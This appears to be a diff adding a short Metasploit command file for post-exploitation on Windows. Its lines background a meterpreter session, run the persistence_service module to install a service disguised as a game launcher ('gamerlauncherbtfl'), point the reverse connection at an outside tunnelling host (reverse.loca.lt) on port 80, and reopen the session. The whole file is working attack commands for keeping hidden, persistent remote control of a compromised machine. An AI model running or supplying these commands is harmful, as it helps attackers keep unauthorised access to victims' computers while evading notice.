@@ -1,0 +1,8 @@
+background (#out sessions meterpreter in background)
+use exploit/windows/local/persistence_service
+set SESSION 1
+set LPORT 80
+set LHOST reverse.loca.lt
+set SERVICE_NAME gamerlauncherbtfl
+run
+sessions -i 1 (#launch the meterpreter sessions)
